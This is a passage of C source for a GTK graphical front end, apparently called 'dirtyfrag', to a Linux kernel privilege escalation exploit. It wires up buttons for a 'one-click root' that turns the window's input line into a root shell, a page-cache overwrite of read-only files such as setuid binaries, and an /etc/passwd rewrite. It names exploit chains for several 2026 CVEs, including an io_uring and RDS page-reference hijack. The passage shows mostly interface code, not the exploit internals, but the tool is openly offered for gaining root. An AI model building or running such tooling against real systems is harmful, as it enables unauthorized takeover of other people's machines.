                     "并在成功后把当前会话接管为 root。"))
        return;

    app_spawn(a, args, "一键提权");
}

static void act_write(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[10];
    int n = 0;
    const char *to, *set, *off;
    char cmd[700];

    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "43500 的写位置固定在 /etc/passwd 首行，不支持 -to/-set。");
        return;
    }
    to = entry_text(a->entry_to);
    set = entry_text(a->entry_set);
    if (!to || !set) {
        show_info(a, GTK_MESSAGE_INFO, "缺少参数",
                  "通用写需要同时指定目标文件与内容文件。",
                  "目标文件只需可读：写的是页缓存，不落盘、不需要写权限。");
        return;
    }
    if (!strcmp(c->id, "-2026-43500")) {
        show_info(a, GTK_MESSAGE_INFO, "该链不支持通用写",
                  "CVE-2026-43500 只能改 /etc/passwd 首行。",
                  "想验证它请直接点「一键提权」。");
        return;
    }
    if (c->engine == 1) {
        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                  "CVE-2026-64531 的写原语只能做 32 位递减，"
                  "不能整段写文件。",
                  "请直接用「一键提权」或「自测」。");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-to";
    args[n++] = (char *)to;
    args[n++] = "-set";
    args[n++] = (char *)set;
    if ((off = entry_text(a->entry_offset)) != NULL) {
        args[n++] = "-offset";
        args[n++] = (char *)off;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -to %s -set %s%s%s",
               a->poc_path, c->id, to, set,
               off ? " -offset " : "", off ? off : "");
    if (!confirm_run(a, "通用写", cmd,
                     "写的是页缓存而非磁盘，目标只需读权限；"
                     "写完会读回校验，但不会执行目标。"))
        return;

    app_spawn(a, args, "通用写");
}

/* 按 CVE id 找链在下拉框里的下标 (0 = 全部链, 所以 +1) */
static int chain_combo_index(const char *id)
{
    int i;

    for (i = 0; i < N_CHAINS; i++)
        if (!strcmp(chains[i].id, id))
            return i + 1;

    return -1;
}

static void on_pick_uaf(GtkWidget *w, gpointer data)
{
    App *a = data;
    int idx = chain_combo_index("-2026-43494");

    (void)w;
    if (idx > 0)
        gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), idx);
}

static void on_test_uaf(GtkWidget *w, gpointer data)
{
    App *a = data;

    on_pick_uaf(w, data);
    act_test(w, a);
}

static void on_collapse_clicked(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->btn_expand)
        gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(a->btn_expand), FALSE);
}

static void on_toggle_expand(GtkWidget *w, gpointer data)
{
    App *a = data;
    gboolean on = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(w));

    if (a->revealer)
        gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), on);
    if (a->lbl_expand)
        gtk_label_set_text(GTK_LABEL(a->lbl_expand), on ? "收起" : "展开");
    if (a->img_expand)
        gtk_image_set_from_icon_name(GTK_IMAGE(a->img_expand),
                                     on ? "go-down-symbolic"
                                        : "go-next-symbolic",
                                     GTK_ICON_SIZE_MENU);
}

static void act_stop(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    app_stop(a);
}

static void act_send(GtkWidget *w, gpointer data)
{
    App *a = data;
    const char *txt;

    (void)w;
    if (!a->running || a->master_fd < 0)
        return;

    txt = gtk_entry_get_text(GTK_ENTRY(a->entry_input));
    if (txt && *txt) {
        if (write(a->master_fd, txt, strlen(txt)) < 0) {
            /* pty 已关闭, 忽略 */
        }
    }
    if (write(a->master_fd, "\r", 1) < 0) {
        /* 同上 */
    }
    gtk_entry_set_text(GTK_ENTRY(a->entry_input), "");
}

static void act_ctrlc(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running && a->master_fd >= 0) {
        if (write(a->master_fd, "\003", 1) < 0) {
            return;
        }
    }
}

static void on_entry_activate(GtkEntry *e, gpointer data)
{
    act_send(GTK_WIDGET(e), data);
}

/* 文件名浏览 */
static void on_file_set(GtkFileChooserButton *b, gpointer data)
{
    char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(b));

    if (fn) {
        gtk_entry_set_text(GTK_ENTRY(data), fn);
        g_free(fn);
    }
}

static GtkWidget *make_file_button(const char *title, GtkWidget *entry)
{
    GtkWidget *b = gtk_file_chooser_button_new(title, GTK_FILE_CHOOSER_ACTION_OPEN);

    gtk_file_chooser_set_current_folder(GTK_FILE_CHOOSER(b), g_get_home_dir());
    gtk_widget_set_size_request(b, 132, -1);
    g_signal_connect(b, "file-set", G_CALLBACK(on_file_set), entry);
    return b;
}

/* ---------------------------------------------------------------------------
 * 界面搭建
 * ------------------------------------------------------------------------ */
static void install_css(void)
{
    static const char *css =
        /*
         * 窗口自身必须有一层不透明底色。置成 transparent 时, 无合成器的
         * X11 (多数 XFCE 会话) 不会清窗口像素, 拖动/缩放时漏画的区域会
         * 直接露出桌面图标, 看起来就是"画面撕裂"。
         */
        "#mainwin { background-color: #eef4fb; }\n"
        "#mainwin, #mainwin label { color: #24323f; }\n"

        /* 标题栏 */
        "#mainwin headerbar {\n"
        "  background-image: none;\n"
        "  background-color: #f1f7fd;\n"
        "  border-bottom: 1px solid #d3e2f0;\n"
        "  box-shadow: none;\n"
        "  min-height: 38px;\n"
        "}\n"
        "#mainwin headerbar label { color: #1e2c3a; }\n"
        "#mainwin headerbar .subtitle { color: #5a7691; font-size: 9pt; }\n"
        "#mainwin headerbar button {\n"
        "  background-image: none;\n"
        "  background-color: transparent;\n"
        "  border: none;\n"
        "  box-shadow: none;\n"
        "}\n"
        "#mainwin headerbar button:hover { background-color: #dcebf8; }\n"

        /* 卡片 */
        "#mainwin frame.card {\n"
        "  background-color: rgba(251,253,255,0.50);\n"
        "  border: 1px solid #d5e5f4;\n"
        "  border-radius: 12px;\n"
        "}\n"
        "#mainwin frame.card > label {\n"
        "  background-color: #f9fcff;\n"
        "  color: #4a6b8a;\n"
        "  font-weight: bold;\n"
        "  padding: 0 4px;\n"
        "}\n"

        /*
         * 日志区必须是"不透明"的白。
         *
         * GtkTextView 有独立的 X11 子窗口: 背景一旦设成 transparent 或
         * 半透明, 在没有合成器的会话里这个子窗口就不清屏, 直接露出未定义
         * 像素 —— 表现就是一块纯黑或半截花屏。GtkScrolledWindow 同理,
         * 有些 GTK 版本根本不画它的背景。
         *
         * 所以这里把 frame / scrolledwindow / viewport / textview 四层
         * 全部显式设成实白, 哪一层被绘制都能兜住, 与 GTK 版本无关。
         */
        "#mainwin #logcard {\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #d5e5f4;\n"
        "  border-radius: 12px;\n"
        "  padding: 0;\n"
        "}\n"
        "#mainwin #logcard scrolledwindow,\n"
        "#mainwin #logcard viewport,\n"
        "#mainwin #logcard textview,\n"
        "#mainwin #logcard textview text {\n"
        "  background-image: none;\n"
        "  background-color: #ffffff;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  color: #2b3644;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  font-family: \"Noto Sans Mono CJK SC\", \"Source Han Mono SC\", \n"
        "               \"Sarasa Mono SC\", \"WenQuanYi Micro Hei Mono\", \n"
        "               \"WenQuanYi Zen Hei Mono\", \"Ubuntu Mono\", \n"
        "               \"DejaVu Sans Mono\", monospace;\n"
        "  font-size: 12px;\n"
        "  padding: 6px;\n"
        "}\n"

        /* 输入控件 */
        "#mainwin entry {\n"
        "  background-image: none;\n"
        "  background-color: rgba(255,255,255,0.56);\n"
        "  border: 1px solid rgba(163,192,217,0.62);\n"
        "  border-radius: 8px;\n"
        "  padding: 4px 8px;\n"
        "  color: #1f2b38;\n"
        "}\n"
        "#mainwin entry:focus { border-color: #74aede; }\n"
        "#mainwin button {\n"
        "  background-image: none;\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #cfdfee;\n"
        "  border-radius: 8px;\n"
        "  padding: 3px 12px;\n"
        "  color: #21313f;\n"
        "}\n"
        "#mainwin button:hover { background-color: #eef7ff; border-color: #a9cbe8; }\n"
        "#mainwin button:active, #mainwin button:checked { background-color: #dcecfb; }\n"
        "#mainwin button:disabled {\n"
        "  color: #a8b6c4;\n"
        "  background-color: #f5f9fd;\n"
        "  border-color: #e2ecf5;\n"
        "}\n"
        "#mainwin button.suggested-action {\n"
        "  background-color: #79b6e6;\n"
        "  border-color: #5d9fd4;\n"
        "  color: #ffffff;\n"
        "  font-weight: bold;\n"
        "}\n"
        "#mainwin button.suggested-action:hover { background-color: #8ac4ee; }\n"
        "#mainwin button.destructive-action {\n"
        "  background-color: #ef9a9a;\n"
        "  border-color: #dd8484;\n"
        "  color: #ffffff;\n"
        "}\n"

        /* 状态与提示 */
        "#mainwin #status-ok   { color: #1c7a44; font-weight: bold; }\n"
        "#mainwin #status-warn { color: #9a6a00; font-weight: bold; }\n"
        "#mainwin #status-err  { color: #b3261e; font-weight: bold; }\n"
        "#mainwin #status-run  { color: #1f5fa8; font-weight: bold; }\n"
        "#mainwin #title-name  { color: #1b3a57; }\n"
        "#mainwin #hint { color: #5f7d99; font-size: 9pt; }\n"
        "#mainwin #banner-warn {\n"
        "  background-color: #fdecea;\n"
        "  color: #9c1c16;\n"
        "  border: 1px solid #f0b7b1;\n"
        "  border-radius: 10px;\n"
        "  padding: 6px 10px;\n"
        "}\n"
        "tooltip, tooltip label { color: #f7fbff; }\n";
    GtkCssProvider *p = gtk_css_provider_new();

    gtk_css_provider_load_from_data(p, css, -1, NULL);
    gtk_style_context_add_provider_for_screen(
        gdk_screen_get_default(),
        GTK_STYLE_PROVIDER(p),
        GTK_STYLE_PROVIDER_PRIORITY_APPLICATION);
    g_object_unref(p);
}

static void make_log_tags(App *a)
{
    static const char *names[8] = {
        "fg-black", "fg-red", "fg-green", "fg-yellow",
        "fg-blue", "fg-magenta", "fg-cyan", "fg-white"
    };
    /* 浅色纸面配色, 保证在白底上也够深 */
    static const char *colors[8] = {
        "#6b7684", "#c0392b", "#1f7a3d", "#8a6100",
        "#1f5fa8", "#8b3fa8", "#0f6f7a", "#232b36"
    };
    int i;

    for (i = 0; i < 8; i++)
        a->tag_fg[i] = gtk_text_buffer_create_tag(a->logbuf, names[i],
                                                  "foreground", colors[i], NULL);
    a->tag_bold = gtk_text_buffer_create_tag(a->logbuf, "bold", "weight",
                                             PANGO_WEIGHT_BOLD, NULL);
    a->tag_dim = gtk_text_buffer_create_tag(a->logbuf, "dim", "foreground",
                                            "#8b96a3", NULL);
}

static GtkWidget *build_params(App *a)
{
    GtkWidget *grid = gtk_grid_new();
    GtkWidget *lbl, *browse;

    gtk_grid_set_row_spacing(GTK_GRID(grid), 6);
    gtk_grid_set_column_spacing(GTK_GRID(grid), 8);

    /* 三列统一: 标签 / 输入框 / 浏览按钮, 保证三行按钮右边缘对齐 */

    /* -t 目标 */
    lbl = gtk_label_new("-t 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_widget_set_size_request(lbl, 68, -1);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 0, 1, 1);

    a->entry_target = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                   "留空则自动选择 setuid-root 的 su");
    gtk_widget_set_hexpand(a->entry_target, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_target, 1, 0, 1, 1);

    browse = make_file_button("选择 setuid 目标", a->entry_target);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 0, 1, 1);

    /* -to 目标 */
    lbl = gtk_label_new("-to 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 1, 1, 1);

    a->entry_to = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_to),
                                   "要被覆盖的文件 (只需可读)");
    gtk_widget_set_hexpand(a->entry_to, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_to, 1, 1, 1, 1);

    browse = make_file_button("选择目标文件", a->entry_to);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 1, 1, 1);

    /* -set 内容 */
    lbl = gtk_label_new("-set 内容");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 2, 1, 1);

    a->entry_set = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_set),
                                   "内容来源文件");
    gtk_widget_set_hexpand(a->entry_set, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_set, 1, 2, 1, 1);

    browse = make_file_button("选择内容文件", a->entry_set);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 2, 1, 1);

    /* 偏移 + 选项 */
    lbl = gtk_label_new("-offset");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 3, 1, 1);

    {
        GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);

        a->entry_offset = gtk_entry_new();
        gtk_entry_set_width_chars(GTK_ENTRY(a->entry_offset), 8);
        gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_offset), "0x0");
        gtk_widget_set_tooltip_text(a->entry_offset,
                                    "通用写起始偏移，支持 0x 前缀；留空为 0");
        gtk_box_pack_start(GTK_BOX(row), a->entry_offset, FALSE, FALSE, 0);

        a->chk_nobackup = gtk_check_button_new_with_label("不备份");
        gtk_widget_set_tooltip_text(a->chk_nobackup,
                                    "跳过写入前的备份。默认会先备份目标文件。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_nobackup, FALSE, FALSE, 0);

        a->chk_verbose = gtk_check_button_new_with_label("详细日志");
        gtk_widget_set_tooltip_text(a->chk_verbose,
                                    "输出更多调试信息 (-v)，用于定位失败原因。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_verbose, FALSE, FALSE, 0);

        gtk_grid_attach(GTK_GRID(grid), row, 1, 3, 2, 1);
    }

    return grid;
}

static GtkWidget *build_actions(App *a)
{
    GtkWidget *box = gtk_button_box_new(GTK_ORIENTATION_HORIZONTAL);

    gtk_button_box_set_layout(GTK_BUTTON_BOX(box), GTK_BUTTONBOX_START);
    gtk_box_set_spacing(GTK_BOX(box), 6);

    a->btn_check = gtk_button_new_with_label("检查配置");
    gtk_widget_set_tooltip_text(a->btn_check,
                                "读取内核 .config 与模块状态，判断每条链的前提是否满足");
    gtk_container_add(GTK_CONTAINER(box), a->btn_check);

    a->btn_test = gtk_button_new_with_label("自测");
    gtk_widget_set_tooltip_text(a->btn_test,
                                "只写自己创建的临时文件，验证写原语是否真的生效");
    gtk_container_add(GTK_CONTAINER(box), a->btn_test);

    a->btn_find = gtk_button_new_with_label("扫描 setuid");
    gtk_widget_set_tooltip_text(a->btn_find,
                                "列出 setuid-root 文件并评估 nosuid / 只读挂载");
    gtk_container_add(GTK_CONTAINER(box), a->btn_find);

    a->btn_write = gtk_button_new_with_label("通用写");
    gtk_widget_set_tooltip_text(a->btn_write,
                                "把 -set 的内容写进 -to 的页缓存，写完校验但不执行");
    gtk_container_add(GTK_CONTAINER(box), a->btn_write);

    a->btn_lpe = gtk_button_new_with_label("一键提权");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_lpe),
                                "suggested-action");
    gtk_widget_set_tooltip_text(a->btn_lpe,
                                "执行所选链的 -start；成功后这里会变成 root shell");
    gtk_container_add(GTK_CONTAINER(box), a->btn_lpe);

    a->btn_stop = gtk_button_new_with_label("停止");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_stop),
                                "destructive-action");
    gtk_widget_set_sensitive(a->btn_stop, FALSE);
    gtk_container_add(GTK_CONTAINER(box), a->btn_stop);

    return box;
}

/*
 * 左上角「展开」按钮拉开的那块面板。
 *
 * UAF 接入点: a->uaf_slot 是一个空的水平 GtkBox, 后续要加的目标文件 /
 * 偏移 / 次数之类控件直接 pack 进去即可, 无需改动布局代码。
 */
static GtkWidget *build_uaf_panel(App *a)
{
    GtkWidget *frame = gtk_frame_new(NULL);
    GtkWidget *outer = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    GtkWidget *lbl, *btn;

    gtk_style_context_add_class(gtk_widget_get_style_context(frame), "card");

    lbl = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(lbl), "<b>UAF 扩展区</b>");
    gtk_widget_set_halign(lbl, GTK_ALIGN_START);
    gtk_box_pack_start(GTK_BOX(row), lbl, FALSE, FALSE, 0);

    btn = gtk_button_new_with_label("选中 43494");
    gtk_widget_set_tooltip_text(btn, "把下拉框切到 CVE-2026-43494 (io_uring + RDS)");
    g_signal_connect(btn, "clicked", G_CALLBACK(on_pick_uaf), a);
    gtk_box_pack_start(GTK_BOX(row), btn, FALSE, FALSE, 0);

    btn = gtk_button_new_with_label("自测该链");
    gtk_widget_set_tooltip_text(btn, "选中 43494 并立即跑自测");
    g_signal_connect(btn, "clicked", G_CALLBACK(on_test_uaf), a);
    gtk_box_pack_start(GTK_BOX(row), btn, FALSE, FALSE, 0);

    /* 右侧留白 + 收起按钮 */
    btn = gtk_button_new_with_label("收起");
    g_signal_connect(btn, "clicked", G_CALLBACK(on_collapse_clicked), a);
    gtk_box_pack_end(GTK_BOX(row), btn, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(outer), row, FALSE, FALSE, 0);

    lbl = gtk_label_new("CVE-2026-43494  io_uring + RDS 页引用计数劫持，"
                        "整页覆盖 setuid 文件的页缓存；依赖 "
                        "IORING_REGISTER_CLONE_BUFFERS（内核 6.12+）。");
    gtk_widget_set_name(lbl, "hint");
    gtk_label_set_xalign(GTK_LABEL(lbl), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(lbl), TRUE);
    gtk_box_pack_start(GTK_BOX(outer), lbl, FALSE, FALSE, 0);

    /* ==== UAF 扩展插槽: 新控件 pack 到这里 ==== */
    a->uaf_slot = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    lbl = gtk_label_new("插槽: UAF 专用控件加在这里");
    gtk_widget_set_name(lbl, "hint");
    gtk_box_pack_start(GTK_BOX(a->uaf_slot), lbl, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(outer), a->uaf_slot, FALSE, FALSE, 0);

    gtk_widget_set_margin_start(outer, 10);
    gtk_widget_set_margin_end(outer, 10);
    gtk_widget_set_margin_top(outer, 8);
    gtk_widget_set_margin_bottom(outer, 8);
    gtk_container_add(GTK_CONTAINER(frame), outer);

    return frame;
}

static GtkWidget *build_log_pane(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *card = gtk_frame_new(NULL);
    GtkWidget *scroller = gtk_scrolled_window_new(NULL, NULL);
    GtkWidget *inrow = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    GtkWidget *lbl;

    /* 底色由 frame 负责: scrolledwindow 在部分 GTK 版本不画自身背景 */
    gtk_frame_set_shadow_type(GTK_FRAME(card), GTK_SHADOW_NONE);
    gtk_widget_set_name(card, "logcard");
    gtk_widget_set_vexpand(card, TRUE);

    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);
    gtk_container_add(GTK_CONTAINER(card), scroller);

    a->logview = gtk_text_view_new();
    a->logbuf = gtk_text_view_get_buffer(GTK_TEXT_VIEW(a->logview));
    gtk_text_view_set_editable(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_cursor_visible(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_monospace(GTK_TEXT_VIEW(a->logview), TRUE);
    gtk_text_view_set_pixels_above_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_pixels_below_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_wrap_mode(GTK_TEXT_VIEW(a->logview), GTK_WRAP_CHAR);
    gtk_text_view_set_left_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_right_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_top_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_text_view_set_bottom_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_widget_set_name(a->logview, "logview");
    gtk_container_add(GTK_CONTAINER(scroller), a->logview);

    {
        GtkTextIter end;

        gtk_text_buffer_get_end_iter(a->logbuf, &end);
        a->log_end_mark = gtk_text_buffer_create_mark(a->logbuf, "end",
                                                      &end, FALSE);
    }
    make_log_tags(a);

    /* 输入行 */
    lbl = gtk_label_new("输入");
    gtk_box_pack_start(GTK_BOX(inrow), lbl, FALSE, FALSE, 0);
    a->entry_input = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_input),
                                   "回车发送；提权成功后这里是 root shell");
    gtk_widget_set_hexpand(a->entry_input, TRUE);
    gtk_box_pack_start(GTK_BOX(inrow), a->entry_input, TRUE, TRUE, 0);

    a->btn_send = gtk_button_new_with_label("发送");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_send, FALSE, FALSE, 0);

    a->btn_ctrlc = gtk_button_new_with_label("Ctrl-C");
    gtk_widget_set_tooltip_text(a->btn_ctrlc, "向子进程发送中断信号 (0x03)");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_ctrlc, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(vbox), card, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), inrow, FALSE, FALSE, 0);

    return vbox;
}

static void on_menu_help(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    const char *lines[] = {
        "检查配置", "  读取 /proc/config.gz 或 /boot/config-$(uname -r)，",
        "  逐条判断 CONFIG 与模块加载状态。",
        "",
        "自测", "  只写自己创建的临时文件（跳过 tmpfs），",
        "  验证写原语本机是否真的生效。不碰系统文件。",
        "",
        "扫描 setuid", "  -find：列出 setuid-root 文件，标注 nosuid / 只读挂载。",
        "",
        "通用写", "  用 -set 的内容覆盖 -to 的页缓存，可带 -offset。",
        "  目标只需读权限；写完会读回校验，但不执行。",
        "",
        "一键提权", "  执行 -start。成功后本窗口的输入行即是 root shell。",
        "",
        "退出码", "  0 完成   1 未通过   2 参数或前置条件   3 本机不可用",
        NULL
    };
    GString *s = g_string_new(NULL);
    int i;

    for (i = 0; lines[i]; i++) {
        g_string_append(s, lines[i]);
        g_string_append_c(s, '\n');
    }
    show_info(a, GTK_MESSAGE_INFO, "使用说明", "各按钮在做什么", s->str);
    g_string_free(s, TRUE);
}

static void on_menu_about(GtkWidget *w, gpointer data)
{
    App *a = data;
    char body[1024];

    (void)w;

    g_snprintf(body, sizeof(body),
               "构建: %s\n内核: %s\n用户: %s (uid=%u)\n引擎: %s\n\n"
               "仅供自有机器与授权测试使用。",
               DF_BUILD, kernel_release(), user_name(), (unsigned)getuid(),
               a->poc_builtin ? "内置 (本程序 --engine)"
                              : (a->poc_path ? a->poc_path : "(未找到)"));
    show_info(a, GTK_MESSAGE_INFO, "关于", APP_TITLE, body);
}

static void on_menu_clear(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    gtk_text_buffer_set_text(a->logbuf, "", -1);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已清空");
    gtk_widget_set_name(a->status_lbl, "status-run");
}

static char *log_all_text(App *a)
{
    GtkTextIter s, e;

    gtk_text_buffer_get_bounds(a->logbuf, &s, &e);
    return gtk_text_buffer_get_text(a->logbuf, &s, &e, FALSE);
}

static void on_menu_save(GtkWidget *w, gpointer data)
{
    App *a = data;
    GtkWidget *dlg;

    (void)w;
    dlg = gtk_file_chooser_dialog_new("保存日志", GTK_WINDOW(a->window),
                                      GTK_FILE_CHOOSER_ACTION_SAVE,
                                      "取消", GTK_RESPONSE_CANCEL,
                                      "保存", GTK_RESPONSE_ACCEPT, NULL);
    gtk_file_chooser_set_current_name(GTK_FILE_CHOOSER(dlg), "dirtyfrag-log.txt");
    gtk_file_chooser_set_do_overwrite_confirmation(GTK_FILE_CHOOSER(dlg), TRUE);

    if (gtk_dialog_run(GTK_DIALOG(dlg)) == GTK_RESPONSE_ACCEPT) {
        char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(dlg));
        char *txt = log_all_text(a);

        if (fn && txt && g_file_set_contents(fn, txt, -1, NULL)) {
            char msg[PATH_MAX + 32];
            g_snprintf(msg, sizeof(msg), "日志已保存: %s", fn);
            gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
        } else {
            gtk_label_set_text(GTK_LABEL(a->status_lbl), "保存失败");
          }
        g_free(txt);
        g_free(fn);
    }
    gtk_widget_destroy(dlg);
}

static void on_menu_copy(GtkWidget *w, gpointer data)
{
    App *a = data;
    char *txt = log_all_text(a);

    (void)w;
    gtk_clipboard_set_text(gtk_clipboard_get(GDK_SELECTION_CLIPBOARD), txt, -1);
    g_free(txt);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已复制到剪贴板");
}

static void on_window_destroy(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running) {
        app_kill(a, SIGKILL);
        g_spawn_close_pid(a->pid);
    }
    gtk_main_quit();
}

static GtkWidget *build_header(App *a)
{
    GtkWidget *hb = gtk_header_bar_new();
    GtkWidget *mb = gtk_menu_button_new();
    GtkWidget *menu = gtk_menu_new();
    GtkWidget *mi;

    gtk_header_bar_set_title(GTK_HEADER_BAR(hb), APP_TITLE);
    gtk_header_bar_set_subtitle(GTK_HEADER_BAR(hb), APP_SUBTITLE);
    gtk_header_bar_set_show_close_button(GTK_HEADER_BAR(hb), TRUE);

    /* 左上角: 展开 / 收起扩展面板 */
    {
        GtkWidget *ebox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 4);

        a->img_expand = gtk_image_new_from_icon_name("go-next-symbolic",
                                                     GTK_ICON_SIZE_MENU);
        a->lbl_expand = gtk_label_new("展开");
        gtk_box_pack_start(GTK_BOX(ebox), a->img_expand, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(ebox), a->lbl_expand, FALSE, FALSE, 0);

        a->btn_expand = gtk_toggle_button_new();
        gtk_widget_set_valign(a->btn_expand, GTK_ALIGN_CENTER);
        gtk_container_add(GTK_CONTAINER(a->btn_expand), ebox);
        gtk_widget_set_tooltip_text(a->btn_expand, "展开 / 收起扩展面板");
        g_signal_connect(a->btn_expand, "toggled",
                         G_CALLBACK(on_toggle_expand), a);
        gtk_header_bar_pack_start(GTK_HEADER_BAR(hb), a->btn_expand);
    }

    gtk_button_set_image(GTK_BUTTON(mb),
                         gtk_image_new_from_icon_name("open-menu-symbolic",
                                                      GTK_ICON_SIZE_BUTTON));
    gtk_widget_set_tooltip_text(mb, "菜单");

    mi = gtk_menu_item_new_with_label("复制日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_copy), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("保存日志…");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_save), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("清空日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_clear), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("使用说明");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_help), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_separator_menu_item_new();
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("关于");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_about), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    gtk_widget_show_all(menu);
    gtk_menu_button_set_popup(GTK_MENU_BUTTON(mb), menu);
    gtk_header_bar_pack_end(GTK_HEADER_BAR(hb), mb);

    return hb;
}

static void build_window(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    GtkWidget *head = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *chainbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
    GtkWidget *frame_params, *frame_actions, *pane, *overlay;
    GtkWidget *statusbar = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    char status[256];

    a->window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(a->window), APP_TITLE);
    /* 小屏幕 (1024x600 之类) 上不要撑出屏幕外, 留出面板和标题栏 */
    {
        GdkDisplay *dpy = gdk_display_get_default();
        GdkMonitor *mon = dpy ? gdk_display_get_primary_monitor(dpy) : NULL;
        GdkRectangle geo = { 0, 0, 1280, 800 };
        int ww, hh;

        if (mon)
            gdk_monitor_get_workarea(mon, &geo);   /* 已扣掉面板/任务栏 */
        /* 左右各留 40px: 小屏上窗口贴边后不容易再拖回来 */
        ww = MIN(980, geo.width - 80);
        hh = MIN(760, geo.height - 90);
        if (ww < 640)
            ww = 640;
        if (hh < 460)
            hh = 460;
